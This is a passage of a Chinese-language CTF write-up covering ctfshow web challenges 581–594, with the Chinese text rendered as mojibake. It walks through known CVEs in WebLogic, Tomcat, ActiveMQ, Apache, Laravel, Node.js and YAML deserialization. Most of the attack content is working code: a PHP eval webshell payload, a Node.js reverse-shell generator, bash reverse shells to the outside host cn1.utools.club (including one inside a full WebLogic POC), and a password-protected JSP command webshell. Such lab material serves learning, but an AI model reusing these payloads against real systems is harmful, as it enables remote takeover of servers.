<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">content=!php/object O:3:&quot;log&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>åªè¦å¸¦ä¸Š!php&#x2F;object  åé¢å°±ä¼šè¿›è¡Œååºåˆ—åŒ–<br>å†™å…¥æ–‡ä»¶åè®¿é—®<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web581-1.png"></p>
<h1 id="WEB582"><a href="#WEB582" class="headerlink" title="WEB582"></a>WEB582</h1><p>nodejsshell.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(<span class="hljs-number">0</span>)<br><br>IP_ADDR = sys.argv[<span class="hljs-number">1</span>]<br>PORT = sys.argv[<span class="hljs-number">2</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">charencode</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span><br>    encoded = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string:<br>        encoded = encoded + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(char))<br>    <span class="hljs-keyword">return</span> encoded[<span class="hljs-number">1</span>:]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LPORT = %s&quot;</span> % (PORT)<br>NODEJS_REV_SHELL = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">var net = require(&#x27;net&#x27;);</span><br><span class="hljs-string">var spawn = require(&#x27;child_process&#x27;).spawn;</span><br><span class="hljs-string">HOST=&quot;%s&quot;;</span><br><span class="hljs-string">PORT=&quot;%s&quot;;</span><br><span class="hljs-string">TIMEOUT=&quot;5000&quot;;</span><br><span class="hljs-string">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span><br><span class="hljs-string">function c(HOST,PORT) &#123;</span><br><span class="hljs-string">    var client = new net.Socket();</span><br><span class="hljs-string">    client.connect(PORT, HOST, function() &#123;</span><br><span class="hljs-string">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span><br><span class="hljs-string">        client.write(&quot;Connected!\\n&quot;);</span><br><span class="hljs-string">        client.pipe(sh.stdin);</span><br><span class="hljs-string">        sh.stdout.pipe(client);</span><br><span class="hljs-string">        sh.stderr.pipe(client);</span><br><span class="hljs-string">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span><br><span class="hljs-string">          client.end(&quot;Disconnected!\\n&quot;);</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">    client.on(&#x27;error&#x27;, function(e) &#123;</span><br><span class="hljs-string">        setTimeout(c(HOST,PORT), TIMEOUT);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">c(HOST,PORT);</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> % (IP_ADDR, PORT)<br><br><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Encoding&quot;</span><br>PAYLOAD = charencode(NODEJS_REV_SHELL)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)<br></code></pre></td></tr></table></figure>
<p>é€šè¿‡nodejsshell.pyç”Ÿæˆpayload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-1.png"><br>æ”¾å…¥<code>&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;ç”Ÿæˆçš„payload&#125;()&quot;,&quot;password&quot;:123&#125;</code>,ç„¶åbase64ç¼–ç åŠ urlç¼–ç <br>bpæŠ“åŒ…ï¼Œæ„é€ ä¸€ä¸ªuserå¹¶ä¼ å…¥payload<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-2.png"><br>æˆåŠŸåå¼¹shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web582-3.png"></p>
<h1 id="WEB583"><a href="#WEB583" class="headerlink" title="WEB583"></a>WEB583</h1><p>CVE-2016-10033<br>åœ¨githubä¸Šæ‰¾åˆ°äº†<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a><br>ç›´æ¥æ‰“å°±è¡Œäº†<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web583-1.png"></p>
<p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªåœ°æ–¹è¦æ³¨æ„<br>ç°åœ¨ï¼ˆ6.17ï¼‰githubä¸Šçš„expæ˜¯æ‰“ä¸é€šçš„<br>æˆ‘æŠŠè¿™ä¸ªå’Œä»¥å‰åœ¨githubä¸Šä¸‹çš„ç‰ˆæœ¬ç”¨beyondæ¯”å¯¹äº†ä¸€ä¸‹<br>ï¼ ç«Ÿç„¶ä¸ä¸€æ ·ï¼Œå¦‚æœä½ ç”¨å®˜ç½‘çš„æ‰“ä¸é€šå¯ä»¥è¯•è¯•æˆ‘è¿™ä¸ª<a href="https://pan.baidu.com/s/1PHYAEyRyubLVZw8cc-iscg">ç‰ˆæœ¬</a>,æå–ç æ˜¯f3rw<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web583-2.png"></p>
<h1 id="WEB584"><a href="#WEB584" class="headerlink" title="WEB584"></a>WEB584</h1><p>ç”Ÿæˆæ•°å­—exp(å°†echoåçš„å†…å®¹æ›¿æ¢æˆä½ è‡ªå·±çš„åå¼¹ä¸€å¥è¯)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br>bytecode = <span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(payload))<br><span class="hljs-built_in">print</span>(bytecode)<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;ç”Ÿæˆçš„æ•°å­—&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>ctfshow<span class="hljs-string">&quot; &#125;]</span><br></code></pre></td></tr></table></figure>
<p>é¦–å…ˆpost &#x2F;api&#x2F;peopleæ–°å»ºä¸€ä¸ªç”¨æˆ·,è·å–åˆ°id<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-1.png"></p>
<p>ç„¶åé€šè¿‡PATCH &#x2F;api&#x2F;people&#x2F;1ï¼Œå¯ä»¥rceåå¼¹shell<br><strong>æ³¨æ„Content-Typeçš„æ ¼å¼</strong></p>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-2.png"><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web584-3.png"></p>
<h1 id="WEB585"><a href="#WEB585" class="headerlink" title="WEB585"></a>WEB585</h1><p>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰<br>ç›´æ¥æŠ“åŒ…ä¼ å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„tomcatå¯¹æ–‡ä»¶åç¼€æœ‰ä¸€å®šéªŒè¯ï¼Œï¼ˆä¸èƒ½ç›´æ¥å†™jspï¼‰ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨ä¸€äº›æ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æ€§ï¼ˆå¦‚Linuxä¸‹å¯ç”¨&#x2F;ï¼‰æ¥ç»•è¿‡é™åˆ¶ã€‚<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web585-1.png"></p>
<p>æ‹¿åˆ°shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web585-2.png"></p>
<p>jspå°é©¬ï¼ˆpwd&#x3D;023ï¼‰</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h1 id="WEB586"><a href="#WEB586" class="headerlink" title="WEB586"></a>WEB586</h1><p>wordpressç¯å¢ƒï¼Œé¦–å…ˆå°è¯•å¼±å£ä»¤ï¼Œè¿›ä¸å»ï¼Œåªå¥½åˆ›å»ºä¸€ä¸ªç”¨æˆ·è¿›è¡Œæµ‹è¯•<br>å‘ç°é‡Œé¢æœ‰ä¸€ç¯‡æ–‡ç« ä»‹ç»äº†è¿™ä¸ªæ’ä»¶æ¼æ´<br>ä½¿ç”¨ç™¾åº¦ï¼Œå‘ç°å¯¹äºä¸‹é¢è¿™ä¸ªåœ°å€çš„idå‚æ•°ï¼ˆpostï¼‰å­˜åœ¨sqlæ³¨å…¥ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤ç›´æ¥å¸¦å…¥äº†sqlè¯­å¥ï¼Œæ‰€ä»¥é€ æˆäº†sqlæ³¨å…¥<br>IP&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;populate_download_edit_form</p>
<p>æˆ‘ç”¨sqlmapè·‘å‡ºæ¥äº†ï¼Œä¹Ÿå¯ä»¥æ‰‹æ³¨ï¼ˆä½¿ç”¨load_fileè¯»æ–‡ä»¶ï¼‰<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web586-1.png"><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web586-2.png"></p>
<h1 id="WEB587"><a href="#WEB587" class="headerlink" title="WEB587"></a>WEB587</h1><p>Weblogic &lt; 10.3.6 â€˜wls-wsatâ€™ XMLDecoder ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰<br>æ¼æ´ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œä½†åœ¨åœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼ˆæ³¨æ„å…¶ä¸­åå¼¹shellçš„è¯­å¥ï¼Œéœ€è¦è¿›è¡Œç¼–ç ï¼Œå¦åˆ™è§£æXMLçš„æ—¶å€™å°†å‡ºç°æ ¼å¼é”™è¯¯ï¼‰ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web587-1.png"><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web587-2.png"><br>POC</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>641<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/cn1.utools.club/45214 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<h1 id="WEB588"><a href="#WEB588" class="headerlink" title="WEB588"></a>WEB588</h1><p>åæ§½ä¸€ä¸‹ï¼šè¿™ä¸€é¢˜çš„ç¯å¢ƒç”Ÿæˆçš„å¥½æ…¢ï¼Œæˆ‘è¿˜ä»¥ä¸ºç¯å¢ƒåäº†</p>
<p>Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰<br>åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„jspæ–‡ä»¶ï¼Œè¿›è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚</p>
<p>è®¿é—®IP&#x2F;ws_utc&#x2F;config.doï¼Œå¦‚æœè¿›å…¥æ—¶ä¸æ˜¯è®¾ç½®é¡µé¢è€Œæ˜¯ç™»é™†é¡µé¢å¯ä»¥åˆ·æ–°ä¸€ä¸‹å¤šè¯•å‡ æ¬¡</p>
<p>è®¾ç½®Work Home Dirä¸º<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>ã€‚æˆ‘å°†ç›®å½•è®¾ç½®ä¸ºws_utcåº”ç”¨çš„é™æ€æ–‡ä»¶cssç›®å½•ï¼Œè®¿é—®è¿™ä¸ªç›®å½•æ˜¯æ— éœ€æƒé™çš„ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚</p>
<p>ç„¶åç‚¹å‡»å®‰å…¨ -&gt; å¢åŠ ï¼Œç„¶åä¸Šä¼ webshellå¹¶æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³ï¼ˆå¯ä»¥æŠ“åŒ…æˆ–F12æŸ¥çœ‹ï¼‰ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web588-1.png"></p>
<p>ç„¶åè®¿é—®IP&#x2F;ws_utc&#x2F;css&#x2F;config&#x2F;keystore&#x2F;[æ—¶é—´æˆ³]_[æ–‡ä»¶å]ï¼Œå³å¯æ‰§è¡Œwebshell(flagåœ¨ç¯å¢ƒå˜é‡é‡Œ)ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web588-2.png"></p>
<h1 id="WEB589"><a href="#WEB589" class="headerlink" title="WEB589"></a>WEB589</h1><p>ActiveMQä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ï¼ˆCVE-2016-3088ï¼‰</p>
<p>é¦–å…ˆè®¿é—®IP&#x2F;admin&#x2F;test&#x2F;systemProperties.jspï¼ŒæŸ¥çœ‹ActiveMQçš„ç»å¯¹è·¯å¾„(è´¦å·å¯†ç ä¸ºadminå¼±å£ä»¤)ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web589-1.png"></p>
<p>ç„¶åPUTæ–¹æ³•ä¸Šä¼ webshellï¼š<br>ä¸Šä¼ æˆåŠŸåå¯ä»¥è®¿é—®çœ‹ä¸€ä¸‹ï¼Œå‘ç°ä»£ç ç›´æ¥æ˜¾ç¤ºäº†ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºæ²¡æœ‰è§£æï¼Œéœ€è¦æ¢ä¸ªç›®å½•<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web589-2.png"></p>
<p>ä½¿ç”¨MOVEæ–¹æ³•ç§»åŠ¨åˆ°webç›®å½•ä¸‹çš„apiæ–‡ä»¶å¤¹ï¼ˆ&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jspï¼‰ä¸­ï¼š<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web589-3.png"><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web589-4.png"></p>
<h1 id="WEB590"><a href="#WEB590" class="headerlink" title="WEB590"></a>WEB590</h1><p>Apereo CASæ˜¯ä¸€æ¬¾Apereoå‘å¸ƒçš„é›†ä¸­è®¤è¯æœåŠ¡å¹³å°ï¼Œå¸¸è¢«ç”¨äºä¼ä¸šå†…éƒ¨å•ç‚¹ç™»å½•ç³»ç»Ÿã€‚å…¶4.1.7ç‰ˆæœ¬ä¹‹å‰å­˜åœ¨ä¸€å¤„é»˜è®¤å¯†é’¥çš„é—®é¢˜ï¼Œåˆ©ç”¨è¿™ä¸ªé»˜è®¤å¯†é’¥æˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„ä¿¡æ¯è§¦å‘ç›®æ ‡ååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>ä½¿ç”¨<a href="https://github.com/vulhub/Apereo-CAS-Attack/releases">Apereo-CAS-Attack</a>æ¥ç”ŸæˆPOC<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web590-1.png"><br>ç„¶åæˆ‘ä»¬ç™»å½•CASå¹¶æŠ“åŒ…ï¼Œå°†Bodyä¸­çš„executionå€¼æ›¿æ¢æˆä¸Šé¢ç”Ÿæˆçš„Payloadå‘é€<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web590-2.png"><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web590-3.png"></p>
<h1 id="WEB591"><a href="#WEB591" class="headerlink" title="WEB591"></a>WEB591</h1><p>591åé¢éƒ½æ˜¯ç¦åˆ©é¢˜äº†ï¼Œå˜¿å˜¿<br>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰<br>åœ¨1.phpåé¢æ’å…¥ä¸€ä¸ª\x0Aï¼ˆæ³¨æ„ï¼Œä¸èƒ½æ˜¯\x0D\x0Aï¼Œåªèƒ½æ˜¯ä¸€ä¸ª\x0Aï¼‰<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web591-1.png"><br>è®¿é—®åˆšæ‰ä¸Šä¼ çš„&#x2F;1.php%0aï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æ<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web591-2.png"></p>
<h1 id="WEB592"><a href="#WEB592" class="headerlink" title="WEB592"></a>WEB592</h1><p>Apache HTTPD å¤šåç¼€è§£ææ¼æ´</p>
<p>ä¸Šä¼ çš„æ–‡ä»¶ä¸­åªè¦åŒ…å«.phpéƒ½èƒ½è¢«è§£æ<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web592-1.png"></p>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web592-2.png"></p>
<h1 id="WEB593"><a href="#WEB593" class="headerlink" title="WEB593"></a>WEB593</h1><p>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´<br>åœ¨æµ‹è¯•ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„æ—¶å€™ï¼Œç›®æ ‡æœåŠ¡ç«¯å¯èƒ½ä¸å…è®¸ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>è¯­æ³•æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web593-1.png"><br>è®¿é—®ç”Ÿæˆçš„æ–‡ä»¶<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web593-2.png"></p>
<h1 id="WEB594"><a href="#WEB594" class="headerlink" title="WEB594"></a>WEB594</h1><p>Laravelå¼€å¯äº†Debugæ¨¡å¼æ—¶ï¼Œç”±äºLaravelè‡ªå¸¦çš„Ignition ç»„ä»¶å¯¹file_get_contents()å’Œfile_put_contents()å‡½æ•°çš„ä¸å®‰å…¨ä½¿ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘èµ·æ¶æ„è¯·æ±‚ï¼Œæ„é€ æ¶æ„Logæ–‡ä»¶ç­‰æ–¹å¼è§¦å‘Pharååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚<br><a href="https://github.com/SNCKER/CVE-2021-3129/blob/master/exploit.py">EXP</a><br>è¿è¡Œexpè¿˜éœ€è¦phpï¼Œpython3ï¼Œlinuxç¯å¢ƒï¼Œä¸‹è½½<a href="https://github.com/ambionics/phpggc">phpggc</a>æ”¾åœ¨åŒä¸€çº§ç›®å½•ä¸‹<br>ä½¿ç”¨æ—¶åªéœ€è¦ä¿®æ”¹expä¸­çš„URLå’Œå‘½ä»¤å³å¯<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web594-1.png"></p>
